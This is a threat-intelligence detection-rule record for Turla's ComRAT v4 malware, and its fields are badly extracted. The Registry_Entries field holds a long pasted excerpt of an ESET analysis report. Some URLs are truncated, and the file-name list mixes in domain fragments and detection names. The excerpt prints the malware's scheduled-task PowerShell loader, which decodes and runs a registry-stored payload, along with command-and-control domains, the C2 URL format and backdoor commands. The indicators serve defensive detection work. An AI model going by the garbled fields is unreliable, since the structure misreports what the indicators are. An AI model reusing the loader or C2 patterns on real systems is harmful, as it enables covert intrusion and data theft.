{"rule_id": 754, "name": "ESET_Turla_ComRAT", "description": "-", "references": [], "File_Names": ["documents.xlsx", "aes_key.pki", "current_transport.str", "id.pki", "AGENT.BTZ", "post_fault_count.int", "post.list", "aol.co", "iecache.bin", "Turla.AP", "command_addr.str", "progress.zyns", "subject.str", "answer_addr.str", "document.docx", "post_index.int", "foods.jkub", "get_index.int", "public_cert.pki", "cookie.str", "Turla.BY", "docs.live", "index.int", "scrabble.ikwb", "FXSAPIDebugTrace.txt", "timeout.int", "Turla.EI", "get_fault_count.int", "wsqmcons.exe", "x64_Release.dll", "jpg.bfe", "get.list"], "MD5_Hashes": [], "SHA1_Hashes": ["0AB87F7BDF7D9E54BA33FE715C11E275D5DCCE15", "4D8B1F4ACC638080054FFBB4CEF2559583A22DC6", "DD7006D16D8E121FCE8F2905433474ECCED75CC0", "0139818441431C72A1935E7F740A1CC458A63452"], "SHA256_Hashes": [], "Registry_Entries": ["HKLM\\SOFTWARE\\Microsoft\\SQMClient\\Windows.WSqmCons\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f10\n\nThe Windows task is usually in C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\ \nCustomer Experience Improvement Program\\Consolidator and contains the following command:\n\n<Actions Context=\u201dWinSQMAccount\u201d>\n\n<Exec>\n\n<Command>cmd.exe</Command>\n<Arguments>/c \u201c%SystemRoot%\\System32\\wsqmcons.exe &amp; powershell.\n\nexe -v 2 \u201c$QAY076ai = \u2018AKWC;HUA389933tomasoas\u2019;[Text.Encoding]::ASCII.\nGetString([Convert]::\\\u201dFr`omBa`se6`4Str`ing\\\u201d((gp HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\\nWindows).WSqmCons))|iex;\u201d\u201d</Arguments>\n\n</Exec>\n</Actions>\n\nNote that the password used to decrypt the ComRAT payload is different on each machine.\n\nIt is interesting to note that while ComRAT\u2019s name is derived from its use of COM object hijacking,  \nin this new version the developers no longer use this method for ensuring persistence.\n\n4.2  Orchestrator\n\nThe PowerShell loader is executed every time the user logs in. It is very similar to the cluster of loaders  \nwe described in 2019 [1] and is based on the Invoke-DllInjection loader from the PowerSploit framework. \nIt loads the ComRAT orchestrator DLL into explorer.exe as shown in Figure 8.\n\nFigure\u00a08 // Injection of the orchestrator into the Explorer process\n\nThis is a C++ DLL existing in 32- and 64-bit versions. It has two exports named UMEP and VFEP.  \nThe 64-bit version is called x64_Release.dll as shown in Figure 9.\n\nFigure\u00a09 // Screenshot of ComRAT\u00a0v4 64-bit orchestrator DLL in Detect It Easy\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey \n \n \n \n \n \n\f11\n\nThe orchestrator embeds an encrypted (XORed with a hardcoded key) communication module  \n(a 32- or 64-bit DLL) that will be injected into the default web browser. The orchestrator interacts  \nwith the ComRAT communication module (described in more detail later) through a named pipe. Thus,  \nall of the malware\u2019s network communications will be initiated in the browser process, which is stealthier \nthan if it was done directly by the orchestrator.\n\nThe orchestrator has some interesting features such as a Virtual File System (VFS) in FAT16 format, which  \nwe describe later, and it can use Gmail to receive commands and to exfiltrate information to the operators. \nFigure 10 is an overview of ComRAT\u2019s architecture.\n\nExisting access \nto the victim's computer \nEx: PowerStallion\n\nExecute\n\n</>\n\nPowerShell \nscript\n\nWrite\n\nCreate\n\nEncrypted payload \nin Windows Registry\n\nWindows task \nfor persistence\n\nLoad payload \nin explorer.exe\n\nexe\n\nOrchestrator running \nin explorer.exe\n\nHTTP request/response \nin a named pipe\n\nInject \ncommunication \nlibrary\n\nDefault browser\n\nC&C Server\n\nGmail address\n\nGMAIL\n\nVirtual FAT16 \nFile System\n\n>_\n\nCommands\n\nEx\ufb01ltrate documents \nto various cloud services\n\nNetwork and Active \nDirectory recon\n\nDrop and execute additional \nmalware programs\n\nMonitor security logs\n\nTurla operator\n\nFigure\u00a010 // Summary of ComRAT architecture\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f12\n\nThe orchestrator is programmed to sleep outside local business hours (9 to 5, Monday to Friday),  \nas shown in Figure 11.\n\nFigure\u00a011 // Business hours check\n\n4.3  Development\n\nOur in-depth analysis of this malware family leads us to believe that the ComRAT developers are both \nexperienced and spent time designing the malware architecture.\n\nWe noticed that they used several design patterns. For example, they use the so-called Abstract Factory \npattern [26] in the code responsible for parsing and creating instructions based on C&C communications,  \nas shown in Figure 12. It is interesting to note that it was implemented using a C++ template. Thus, there  \nis a lot of duplicated code in the compiled binary because each templated class or function will have  \na different implementation for each type it is used with.\n\nFigure\u00a012 // Example of Abstract Factory method pattern\n\nThey also have used other design patterns, such as the Adapter pattern [27], shown in Figure 13,  \nand the Mediator pattern [28], shown in Figure 14.\n\nFigure\u00a013 // Example of Adapter pattern\n\nFigure\u00a014 // Example of Mediator pattern\n\nIt should be noted that, in addition to complex elements such as a FAT16 VFS, ComRAT\u2019s developers  \nuse some obfuscation. Most of the strings in their binaries are string-stacked and encrypted, with a different \nkey per sample, with the apparent goal of preventing easy detection of this malware family.\n\nFinally, they use several third-party libraries:\n\n\u2022  fat_io_lib: for the Virtual File System\n\n\u2022  Gumbo: to parse HTML\n\n\u2022  wolfCrypt: for C&C data (en|de)cryption\n\nOverall, it tells us that the Turla group tasked experienced developers for this new version of ComRAT.  \nBoth the development effort and the technologies used, such as the Virtual File System, make it a counterpart  \nof Carbon [13] and Gazer [14].\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f13\n\n4.4  Virtual File System and configuration\n\nAll the files related to ComRAT, except the orchestrator DLL and scheduled task, are stored in a Virtual  \nFile System. This is a regular file stored at one of these locations:\n\n\u2022  %TEMP%\\FXSAPIDebugTrace.txt\n\u2022  %TEMP%\\iecache.bin\n\nHowever, once decrypted, these files are FAT16 partition images, as shown in Figure 15.\n\nFigure\u00a015 // First bytes of the decrypted FAT16 Virtual File System\n\nThe encryption key is unique per machine, as it is generated during the installation. It uses a variant  \nof Mersenne Twister and takes its seed from std::_Random_device. This 32-byte key is then stored  \nin (HKLM|HKCU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\ \n{59031A47-3F72-44A7-80C5-5595FE6B30EE}\\Order\n\nThe VFS is encrypted using AES-256 in XTS mode. This mode of operation is a standard for disk encryption. \nThe first 16-bytes of the key are used for the block encryption while the last 16-bytes are used to derive  \nthe initialization vector from the sector number.\n\nThe default VFS container file is hardcoded in the orchestrator and dropped the first time it is executed. \nThen, most of the files can be updated using backdoor commands.\n\nIt uses UNIX-like paths so, for example, the log file is located at /var/log/working.c4log. The malware \nuses a third-party library, fat_io_lib, to read the partition. Figure 16 is an overview of the files and folders  \nin the VFS.\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f14\n\nFAT16 Virtual \nFile System\n\nvar\n\nlog\n\nworking.c4log\n\nbin\n\n<Executables>\n\nContains \nlog \ufb01les\n\nContains the con\ufb01guration \nrelated to C&C communications\n\nProbably contains \nmodules (PE executables) \nbut we haven\u2019t seen any \nin the wild.\n\nContains the encryption \nkeys (AES and RSA) \nused for the C&C communications\n\nContains backdoor commands that will be executed \nautomatically. For example, /etc/auto_exec/send_log.c4 \nexecutes the backdoor command 106: SendWorkingLog.\n\nContains commands \nexecuted at startup.\n\netc\n\ntransport\n\nmail\n\nmailboxes\n\n0\n\ncommand_addr.str\n\nanswer_addr.str\n\ncookie.str\n\nservice\n\nindex.int\n\nsubject.str\n\nlegacy\n\nget.list\n\npost.list\n\nservice\n\nget_index.int\n\nget_fault_count.int\n\npost_index.int\n\npost_fault_count.int\n\nservice\n\ncurrent_transport.str\n\ntimeout.int\n\npki\n\naes_key.pki\n\npublic_cert.pki\n\nid.pki\n\nauto_exec\n\nsend_log.c4\n\ninit_d\n\ndir_set_ipcon\ufb01g.c4\n\nFigure\u00a016 // Virtual File System hierarchy\n\nIt is interesting to note that some files use extensions such as c4 or c4log, where c4 most likely stands  \nfor Chinch 4, the internal name of the malware family.\n\nBy mounting the Virtual File System, we get access to all these files. Figure 17 is an example  \nof /etc/transport/legacy/get.list content. This is a list of C&C domains separated with a pipe.\n\nFigure\u00a017 // Content of /etc/transport/legacy/get.list\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f15\n\n4.5  Command & Control channels\n\nComRAT v4 has two different C&C channels: HTTP (internally known as legacy) and email  \n(internally known as mail), which uses the Gmail web interface. The mode to be used  \n(legacy, mail or any) is specified in the file /etc/transport/service/current_transport.str\n\nCommunication module\n\nThe orchestrator retrieves the default browser, by checking HKCR\\http\\shell\\open\\command,  \nand injects the communication DLL, either 32- or 64-bit, into it. These DLLs are hardcoded in the orchestrator  \nand XORed with a static key.\n\nThis module is quite simple as it is just a \u201cbridge\u201d between the orchestrator and the C&C server. The goal  \nis probably to make the malware\u2019s HTTP requests to its C&C appear to be from a process that would  \nbe expected to connect to the internet and make HTTP requests.\n\nThe orchestrator uses a named pipe to interact with the communication module. The pipe name is derived \nfrom the computer name as shown on Figure 18.\n\nFigure\u00a018 // Generation of the pipe name\n\nThe orchestrator sends C&C requests to the communication module, which sends them to the C&C server, \nand that module sends any responses or new commands from the C&C server to the orchestrator,  \nusing the same pipe.\n\nThe communication DLL is slightly obfuscated, in a very similar way to many other Turla malware families. \nAll the strings are string-stacked, some of them XORed, and most of the Windows APIs it uses are resolved \ndynamically.\n\nLegacy/HTTP[S]\n\nThe most basic C&C mode is what the ComRAT developers called legacy mode. Indeed, it is the exact same \nprotocol as implemented in ComRAT v3.x. \n\nWe believe that it is intended to be compatible with C&C servers already in place, avoiding the need  \nto deploy a whole new set of servers. It also gives the operators the flexibility to control old ComRAT \ninstances without the need to upgrade all the victims to version 4. Even if this is an old C&C protocol,  \nit was still being used in the wild in 2020.\n\nTwo lists of C&C servers are stored in the VFS at the paths: /etc/transport/legacy/get.list  \nand /etc/transport/legacy/post.list \n\nThey generally each contain two or three different domains, separated with a pipe character. \n\nThe format of the URL is quite easy to recognize as it hasn\u2019t changed for years: \n\nhttp[s]://<C&C domain>/index/index.php?h=<base64 XOR key>&d=<base64 XORed data>\n\nThe h parameter contains an 8-byte XOR key encoded in base64. It is generated using the rand function \nseeded by the result of a call to the GetTickCount function.\n\nThe d parameter contains the base64-encoded data. It is encrypted using the XOR key in the h parameter.\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f16\n\nEmail\n\nThe second C&C mode is called mail by ComRAT developers. The code is actually very specific to Gmail  \nand we haven\u2019t seen any other version of ComRAT able to use another email provider.\n\nA basic overview of the email C&C mode is shown Figure 19.\n\nComRAT\n\nRead the email address \nand the authentication \ncookies in the Virtual \nFile System\n\nConnect to the \nGmail web UI\n\nParse the HTML \nof the inbox\n\nDownload the email \nattachments\n\nDecrypt each \nattachment\n\nExecute \nthe commands\n\nSend the result \nback by email\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\nSend \ncommands \nby email\n\nControl \nthe mailbox\n\nOperator mailbox \n(often on GMX)\n\nTurla operator\n\nReceive \ncommand results \nby email\n\nFigure\u00a019 // Overview of the email C&C mode\n\nStep 1\n\nThe orchestrator reads the email address in /etc/transport/mail/mailboxes/0/command_addr\n\nIt also reads the cookies to authenticate on Gmail in /etc/transport/mail/mailboxes/0/cookie\n\nThese cookies typically have a limited lifetime so they should be updated from time to time.  \nFigure 20 is a redacted screenshot of the contents of the cookie file.\n\nFigure\u00a020 // Contents of /etc/transport/mail/mailboxes/0/cookie.str (partially redacted)\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f17\n\nStep 2\n\nIt connects to the basic HTML view of Gmail at the URL https://mail google com/mail/?ui=html&zy=g using  \nthe cookies described above. An example of such a view is shown Figure 21.\n\nFigure\u00a021 // Example of the Gmail simplified HTML view \n\n(for demonstration purpose only)\n\nStep 3\n\nIt parses the inbox HTML page using the Gumbo HTML parser in order to extract the list of emails. It will only \nread emails for which the Subject: is in the list at /etc/transport/mail/service/subject, as shown  \nin Figure 22.\n\nFigure\u00a022 // Contents of /etc/transport/mail/service/subject\n\nThen, for each email, it extracts the link to download the attachment. The attachments are generally \nmasquerading as documents with names such as document.docx and documents.xlsx. The body  \nof the email is generally empty. Figure 23 is an example of an email sent by Turla operators  \nto a ComRAT C&C mailbox.\n\nFigure\u00a023 // Email from the Gmail inbox that contains commands in the attachment  \n\n(partially redacted and opened in Microsoft Outlook for demonstration purposes only)\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f18\n\nStep 4\n\nIt downloads all the relevant attachments from Gmail. The email is then deleted so that it is not processed  \na second time.\n\nStep 5\n\nDespite their extensions, the attachments are not docx or xslx files. They contain a blob of data  \nin the following format:\n\n0\n\n4\n\n8\n\n9\n\n9+n\n\n<victim id>\n\nCRC32 of the \nencrypted data\n\n0x01\n\nAES-encrypted \ndata\n\nThe AES-256 key is stored in the VFS in /etc/pki/aes_key and it uses AES in CBC mode with  \na null initialization vector.\n\nStep 6\n\nOnce decrypted, we have access to the backdoor commands and parameters. We provide more details \nabout the backdoor commands in section 4.6. Figure 24 is an example of a decrypted email attachment.  \n0x67 is the ID for \u201cExecute a command with cmd.exe\u201d and it is followed by the command to execute.  \nWe believe that the beginning of the decrypted data is filled with random bytes.\n\nFigure\u00a024 // Decrypted attachment\n\nStep 7\n\nThe backdoor creates an attachment containing the result of the commands. The attachment name consists \nof 20 random digits and of the .jpg.bfe so-called double extension. Its content has the following format:\n\n0\n\n4\n\n8\n\n9\n\n265\n\n265+n\n\n<victim id>\n\nCRC32 of the \nencrypted data\n\n0x01\n\nAES-encrypted \ndata\n\nRSA-encrypted \nAES key (+padding)\n\nThe AES key is different for each email as it is randomly generated. Then, it is encrypted using RSA-2048  \nwith the public key stored in /etc/pki/public_cert.pki. The format of the key is quite unusual  \nas it is raw bytes representing the concatenation of n and e. Turla\u2019s developers did not implement  \nthe RSA encryption themselves; they used code from the wolfSSL library and more specifically  \nfrom a commit before March 2016.\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f19\n\nFinally, and using the Gmail web interface as before, the backdoor sends the email to the address contained \nin /etc/transport/mail/mailboxes/0/answer_addr. This address is typically not hosted on Gmail  \nbut rather on GMX or VFEmail. It is also the email address from which the operators send commands  \nto the Gmail address. Figure 25 is an example of an email created by ComRAT.\n\nFigure\u00a025 // Email sent by ComRAT to the operators\u2019 email address (partially redacted and opened  \n\nin Microsoft Outlook for demonstration purposes only)\n\n4.6  Backdoor commands\n\nThe operators can send commands using either of the C&C channels. The backdoor will receive  \nthe command ID and the arguments, if any.\n\nAs seen in Table 1, the commands implemented in ComRAT v4 are not surprising and allow control of almost \neverything on the machine: manage files, execute additional processes or gather logs.\n\nTable 1 \n\nList of backdoor commands in ComRAT\u00a0v4\n\nID\n\n0x65\n\n0x66\n\n0x67\n\n0x68\n\n0x69\n\n0x6a\n\n0x6b\n\n0x6c\n\n0x6d\n\n0x6e\n\n0x6f\n\n0x70\n\n0x71\n\nName\n\nWriteFile\n\nReadFile\n\nShellExecute\n\nSetTimeout\n\nAddAddress\n\nDescription\n\nWrite in a file\n\nRead a file\n\nExecute a command with cmd.exe \n\nSet the timeout for the C&C channel\n\nAdd an address in /etc/transport/legacy/get.list  \nor in /etc/transport/legacy/post.list\n\nSendWorkingLog\n\nSend /var/log/working.c4log \n\nInvokeBinFromMem\n\nLoad a PE from memory using an internal PE loader\n\nInvokeBinFromFS\n\nLoad a PE from file using an internal PE loader\n\nDeleteAddress\n\nDelete an address from /etc/transport/legacy/get.list  \nor /etc/transport/legacy/post.list\n\nGetConfiguration\n\nGet the configuration\n\nDirStg\n\nRunExe\n\nInvokePSFromMem\n\n0x72\n\nInvokePSFromFS\n\n0x73\n\nDeleteAllMail\n\nList a directory in the Virtual File System\n\nExecute a PE with CreateProcessW\n\nInvoke a PowerShell script from memory using  \na PowerShell runner\n\nInvoke a PowerShell script from a file using  \na PowerShell runner\n\nDelete the messages in the Gmail mailbox (added in the most \nrecent version, first seen around November 2019)\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f20\n\n5.  CONCLUSION\n\nVersion four of ComRAT is a totally revamped malware family released in 2017. Its developers took  \ninspiration from other Turla backdoors, such as Snake, to build a very complex piece of malware.\n\nIts most interesting features are the Virtual File System in FAT16 format and the ability to use the Gmail  \nweb UI to receive commands and exfiltrate data. Thus, it is able to bypass some security controls because  \nit doesn\u2019t rely on any malicious domain. We also noticed that this new version abandoned the use  \nof COM object hijacking for persistence, the method that gave the malware its common name. \n\nWe found indications that ComRAT v4 was still in use at the beginning of 2020, showing that the Turla \ngroup is still very active and a major threat for diplomats and militaries.\n\nWe will continue to monitor Turla developments to help defenders protect their networks.\n\nIndicators of Compromise can also be found on GitHub. For any inquiries, or to make sample  \nsubmissions related to the subject, contact us at: threatintel@eset com.\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f21\n\n6.  BIBLIOGRAPHY\n\n  1  Yle. (2016, 01 13). Russian group behind 2013 Foreign Ministry hack. Retrieved from  \n\nhttps://yle fi/uutiset/osasto/news/russian_group_behind_2013_foreign_ministry_hack/8591548\n\n  2  Boutin, J.-I. (2017, 06 06). Turla\u2019s watering hole campaign: An updated Firefox \n\nextension abusing Instagram. Retrieved from https://www welivesecurity com/2017/06/06/\nturlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/\n\n  3  Cherepanov, A. (2017, 06 30). TeleBots are back: Supply-chain attacks against Ukraine. (ESET) Retrieved from \n\nhttps://www welivesecurity com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/\n\n  4  Cherepanov, A. (2018, 10). GREYENERGY: A successor to BlackEnergy. (ESET) Retrieved from  \n\nhttps://www welivesecurity com/wp-content/uploads/2018/10/ESET_GreyEnergy pdf\n\n  5  Corfield, G. (2020, 02 14). Austrian foreign ministry: \u2018State actor\u2019 hack on government IT systems is over. \n\nRetrieved from https://www theregister co uk/2020/02/14/austria_foreign_ministry_hack_turla_group_allegs/\n\n  6  ESET. (2018, 08). Turla Outlook Backdoor. Retrieved from  \n\nhttps://www welivesecurity com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor pdf\n\n  7  ESET Research. (2017, 03 30). Carbon Paper: Peering into Turla\u2019s second stage backdoor. (ESET) Retrieved from  \n\nhttps://www welivesecurity com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/\n\n  8  ESET Research. (2017, 08). Gazing at Gazer - Turla\u2019s new second stage backdoor. (ESET) Retrieved from \n\nhttps://www welivesecurity com/wp-content/uploads/2017/08/eset-gazer pdf\n\n  9  ESET Research. (2018, 01). Diplomats in Eastern Europe bitten by a Turla mosquito. (ESET) Retrieved from \n\nhttps://www welivesecurity com/wp-content/uploads/2018/01/ESET_Turla_Mosquito pdf\n\n 10  ESET Research. (2018, 05 22). Turla Mosquito: A shift towards more generic tools. Retrieved from  \n\nhttps://www welivesecurity com/2018/05/22/turla-mosquito-shift-towards-generic-tools/\n\n  11  Faou, M. (2019, 05). Turla LightNeuron. Retrieved from  \n\nhttps://www welivesecurity com/wp-content/uploads/2019/05/ESET-LightNeuron pdf\n\n  12  Faou, M. (2020, 03 12). Tracking Turla: New backdoor delivered via Armenian watering holes. Retrieved from \n\nhttps://www welivesecurity com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/\n\n  13  Faou, M., & Dumont, R. (2019, 05 29). A dive into Turla PowerShell usage. Retrieved from  \n\nhttps://www welivesecurity com/2019/05/29/turla-powershell-usage/\n\n  14  G DATA. (2014, 03 07). Uroburos \u2013 Deeper travel into kernel protection mitigation. Retrieved from  \n\nhttps://www gdatasoftware com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation\n\n  15  G DATA. (2015, 01 15). Evolution of sophisticated spyware: from Agent.BTZ to ComRAT. Retrieved from  \n\nhttps://www gdatasoftware com/blog/2015/01/23927-evolution-of-sophisticated-spyware-from-agent-btz-to-comrat\n\n  16  Huss, D. (2017, 08 17). Turla APT actor refreshes KopiLuwak JavaScript backdoor for use \nin G20-themed attack. Retrieved from https://www proofpoint com/us/threat-insight/post/\nturla-apt-actor-refreshes-kopiluwak-javascript-backdoor-use-g20-themed-attack\n\n  17  Kaspersky GReAT. (2018, 10 04). Shedding Skin - Turla\u2019s Fresh Faces. Retrieved from  \n\nhttps://securelist com/shedding-skin-turlas-fresh-faces/88069/\n\n  18  KNOWLTON, B. (2010, 08 25). Military Computer Attack Confirmed. (New York Times) Retrieved 04 09, 2018, \n\nfrom https://www nytimes com/2010/08/26/technology/26cyber html\n\n  19  Managed Adversary and Threat Intelligence (MATI). (2019, 06 20). Waterbug:  \n\nEspionage Group Rolls Out Brand-New Toolset in Attacks Against Governments. Retrieved from  \nhttps://symantec-blogs broadcom com/blogs/threat-intelligence/waterbug-espionage-governments\n\n 20  MELANI. (2016, 05 23). Technical Report about the Malware used in the Cyberespionage against RUAG. \nRetrieved from https://www melani admin ch/melani/en/home/dokumentation/reports/technical-reports/ \ntechnical-report_apt_case_ruag html\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f22\n\n  21  National Cyber Security Centre. (2017, 11 23). Turla group using Neuron and Nautilus tools alongside  \n\nSnake malware. Retrieved from https://www ncsc gov uk/static-assets/documents/Turla%20group%20using \n%20Neuron%20and%20Nautilus%20tools%20alongside%20Snake%20malware_1 pdf\n\n 22 \n\n 23 \n\nSchlee, M. (2018, 03 06). Hackers used Outlook for cyberattack on German government: report. Retrieved \nfrom https://www politico eu/article/report-hackers-used-outlook-for-cyberattack-on-german-government/\n\nShevchenko, S. (2008, 11). Agent.btz - A Threat That Hit Pentagon. Retrieved from  \nhttp://blog threatexpert com/2008/11/agentbtz-threat-that-hit-pentagon html\n\n 24  Tanase, S. (2015, 09 09). Satellite Turla: APT Command and Control in the Sky. Retrieved from  \n\nhttps://securelist com/satellite-turla-apt-command-and-control-in-the-sky/72081/\n\n 25  Untersinger, M. (2019, 01 29). Quelle est la bonne \u00e9quation pour pacifier le cyberespace ? (Le Monde2019) \n\nRetrieved from  \nhttps://www lemonde fr/pixels/article/2019/01/29/course-aux-cyberarmes-logiciels-destructeurs-dormants-le-difficile-\napaisement-du-cyberespace_5416003_4408996 html\n\n 26  Wikipedia. (n.d.). Abstract factory pattern. Retrieved 03 17, 2020, from  \n\nhttps://en wikipedia org/wiki/Abstract_factory_pattern\n\n 27  Wikipedia. (n.d.). Adapter pattern. Retrieved 03 17, 2020, from  \n\nhttps://en wikipedia org/wiki/Adapter_pattern\n\n 28  Wikipedia. (n.d.). Mediator pattern. Retrieved 03 17, 2020, from  \n\nhttps://en wikipedia org/wiki/Mediator_pattern\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f23\n\n7. \n\nINDICATORS OF COMPROMISE\n\n7.1  Hashes\n\nSHA-1\n\nDescription\n\nESET detection name\n\n4D8B1F4ACC638080054FFBB4CEF2559583A22DC6\n\nPowerShell dropper\n\nPowerShell/Turla.X\n\nDD7006D16D8E121FCE8F2905433474ECCED75CC0\n\nComRAT orchestrator\n\nWin64/Turla.BY\n\n0139818441431C72A1935E7F740A1CC458A63452\n\nComRAT orchestrator\n\nWin64/Turla.AP\n\n0AB87F7BDF7D9E54BA33FE715C11E275D5DCCE15\n\nComRAT orchestrator\n\nWin32/Turla.EI\n\n7.2  Paths\n\n%TEMP%\\FXSAPIDebugTrace.txt\n\n%TEMP%\\iecache.bin\n\n7.3  Windows registry\n\n(HKLM|HKCU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\\n{59031A47-3F72-44A7-80C5-5595FE6B30EE}\n\nHKLM\\SOFTWARE\\Microsoft\\SQMClient\\Windows.WSqmCons\n\n7.4  Network\n\narinas[.]tk\n\nbedrost[.]com\n\nbranter[.]tk\n\nbronerg[.]tk\n\ncelestyna[.]tk\n\ncrusider[.]tk\n\ndavilta[.]tk\n\ndeme[.]ml\n\ndixito[.]ml\n\nduke6[.]tk\n\nelizabi[.]tk\n\nfoods.jkub[.]com\n\nhofa[.]tk\n\nhunvin[.]tk\n\nlakify[.]ml\n\nlindaztert[.]net\n\nmisters[.]ml\n\npewyth[.]ga\n\nprogress.zyns[.]com\n\nsameera[.]gq\n\nsanitar[.]ml\n\nscrabble.ikwb[.]com\n\nsumefu[.]gq\n\numefu[.]gq\n\nvefogy[.]cf\n\nvylys[.]com\n\nwekanda[.]tk\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f24\n\n8.  MITRE ATT&CK TECHNIQUES\n\nTactic\n\nID\n\nName\n\nDescription\n\nExecution\n\nT1086\n\nPowerShell\n\nA PowerShell script is used to install ComRAT.\n\nPersistence\n\nT1053\n\nScheduled Task\n\nComRAT uses a scheduled task to launch  \nits PowerShell loader.\n\nT1027\n\nObfuscated Files  \nor Information\n\nThe ComRAT orchestrator is stored encrypted  \nand only decrypted at execution.\n\nDefense \nEvasion\n\nT1055\n\nProcess Injection\n\nT1112\n\nModify Registry\n\nT1016\n\nT1033\n\nSystem Network  \nConfiguration Discovery\n\nSystem Owner/User \nDiscovery\n\nThe ComRAT orchestrator is injected into explorer.exe. \nThe communication DLL is injected into  \nthe default browser.\n\nThe ComRAT orchestrator is stored encrypted  \nin the registry.\n\nOperators execute ipconfig and nbstat.\n\nOperators execute net user.\n\nDiscovery\n\nT1069\n\nPermission Groups Discovery Operators execute net group /domain.\n\nT1082\n\nSystem Information \nDiscovery\n\nOperators execute systeminfo.\n\nT1083\n\nFile and Directory Discovery\n\nOperators list the content of several directories.  \nExample: dir /og-d \u201c%userprofile%\\AppData\\\nRoaming\\Microsoft\\Windows\\Recent\\*.*\u201d.\n\nT1087\n\nAccount Discovery\n\nOperators execute net user and net group.\n\nT1120\n\nPeripheral Device Discovery\n\nOperators execute fsutil fsinfo drives  \nto list the connected drives.\n\nT1135\n\nNetwork Share Discovery\n\nOperators execute net view.\n\nCollection\n\nT1213\n\nT1024\n\nData from Information \nRepositories\n\nCustom Cryptographic \nProtocol\n\nThe Operators use a custom tool to exfiltrate documents \nfrom an internal central database.\n\nComRAT uses RSA and AES to encrypt C&C data.\n\nCommand and \nControl\n\nExfiltration\n\nT1043\n\nCommonly Used Port\n\nComRAT uses ports 80 and 443.\n\nT1071\n\nT1102\n\nT1002\n\nT1022\n\nT1048\n\nStandard Application  \nLayer Protocol\n\nComRAT uses HTTP and HTTPS.\n\nWeb Service\n\nComRAT can be controlled via the Gmail web UI.\n\nData Compressed\n\nThe documents are compressed in a RAR archive.\n\nData Encrypted\n\nThe RAR archive is encrypted with a password.\n\nExfiltration Over  \nAlternative Protocol\n\nData is exfiltrated to cloud storage, mounted locally  \nusing the net use command.\n\nFrom Agent.BTZ to ComRAT v4 A ten-year journey\f"], "URLs": ["https://docs.live.net/E65<redacted>", "https://mail", "https://yle", "https://symantec-blogs"], "weight": 0.0}